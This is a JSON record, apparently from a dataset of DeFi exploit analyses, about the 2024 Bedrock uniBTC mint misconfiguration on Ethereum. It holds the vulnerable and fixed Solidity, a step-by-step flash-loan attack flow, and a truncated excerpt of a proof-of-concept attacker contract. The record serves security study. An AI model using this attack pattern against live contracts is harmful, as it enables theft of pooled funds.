@@ -1,0 +1,42 @@
+{
+ "id": "2024__2024-09-26_RockX_UniBTC_Misconfiguration_ETH",
+ "source_file": "2024/2024-09-26_RockX_UniBTC_Misconfiguration_ETH.md",
+ "title": "RockX UniBTC — Misconfiguration Vulnerability Analysis",
+ "date": "2024-09-26",
+ "protocol": "Bedrock",
+ "chain": "Ethereum",
+ "loss_raw": "~$2,000,000 (649.6 WETH attacker profit; total pool drain impact ~$2M)",
+ "loss_usd": 2000000.0,
+ "root_cause": "Misconfiguration — ETH/uniBTC exchange rate not set",
+ "attack_tx": "0x725f...940",
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control",
+  "business-logic"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: ETH → uniBTC exchange does not reflect actual price ratio\n// EXCHANGE_RATE_BASE = 1e10 (only compensates for decimal difference, ignores price difference)\nuint256 constant EXCHANGE_RATE_BASE = 1e10;\n\nfunction mint() external payable {\n    uint256 uniBTCAmt = msg.value / EXCHANGE_RATE_BASE;\n    // ❌ 1 ETH → 1 uniBTC is minted\n    // In reality, ETH price ≠ BTC price, so this over-mints\n    _mint(msg.sender, uniBTCAmt);\n}",
+  "// ❌ Vulnerable: Native ETH mint allowed without separate validation\n// Whitelisted token list only contains WETH; ETH (address(0)) handling is incorrect\nfunction mint() external payable {\n    // Direct mint with ETH is possible → combines with EXCHANGE_RATE_BASE error\n    uint256 uniBTCAmt = msg.value / EXCHANGE_RATE_BASE;\n    _mint(msg.sender, uniBTCAmt);\n}\n\n// ERC-20 token mint has whitelist validation in a separate function\nfunction mint(address _token, uint256 _amount) external {\n    require(whitelistedTokens[_token], \"Unsupported token\"); // ← This check is absent for ETH\n    ...\n}",
+  "❌ Actual value deposited: 30.8 ETH ≈ $80,000              │\n│"
+ ],
+ "code_after": [
+  "// ✅ Fixed: Reflect ETH/BTC price ratio via an external oracle such as Chainlink\n// Or exclude native ETH from mintable assets\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\nAggregatorV3Interface public ethBtcPriceFeed;\nuint256 constant EXCHANGE_RATE_BASE = 1e10;\n\nfunction mint() external payable {\n    // ✅ Fetch latest ETH/BTC price\n    (, int256 ethBtcPrice,,,) = ethBtcPriceFeed.latestRoundData();\n    require(ethBtcPrice > 0, \"Invalid oracle price\");\n\n    // ✅ Apply actual price ratio: uniBTCAmt = ETH deposited × (ETH price / BTC price) / EXCHANGE_RATE_BASE\n    uint256 uniBTCAmt = (msg.value * uint256(ethBtcPrice)) / (EXCHANGE_RATE_BASE * 1e8);\n    require(uniBTCAmt > 0, \"Mint amount is 0\");\n\n    _mint(msg.sender, uniBTCAmt);\n}",
+  "// ✅ Fixed: Disable native ETH mint entirely, or manage it via a separate control\nfunction mint() external payable {\n    revert(\"Direct ETH mint disabled: please use WBTC or another supported token\");\n}"
+ ],
+ "steps": [
+  "Balancer (0xBA12...C8) → Attacker Contract",
+  "[Step 2] Convert WETH → ETH",
+  "WETH.withdraw(30.8 WETH) → Obtain 30.8 ETH",
+  "→ uniBTC over-minted (~23× excess)",
+  "[Step 4] Uniswap V3 Swap 1: uniBTC → WBTC",
+  "30.8 uniBTC → 27.84 WBTC (0.05% fee, ~1:1 ratio)",
+  "[Step 5] Uniswap V3 Swap 2: WBTC → WETH",
+  "27.84 WBTC → 680.4 WETH",
+  "30.8 WETH → Repaid to Balancer Vault",
+  "649.6 WETH → Transferred to attacker EOA"
+ ],
+ "other_code": [
+  "uniBTC minted = ETH deposited / EXCHANGE_RATE_BASE\n             = ETH deposited / 1e10",
+  "// [Core attack logic excerpt — Bedrock_DeFi_exp.sol]\n// PoC author: rotcivegaf (@rotcivegaf)\n\ncontract Attacker {\n    function attack() external {\n        txSender = msg.sender;\n\n        // [Pre-setup] Approve max allowance to DEX router\n        IFS(uniBTC).approve(uniV3Router, type(uint256).max);\n        IFS(WBTC).approve(uniV3Router, type(uint256).max);\n\n        // [Step 1] Borrow 30.8 WETH via Balancer flash loan\n        address[] memory tokens = new address[](1);\n        tokens[0] = weth;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 30_800_000_000_000_000_000; // 30.8 WETH\n        IFS(balancerVault).flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n    function receiveFlashLoan(...) external {\n        // [Step 2] Convert WETH → ETH\n        IFS(weth).wi"
+ ]
+}
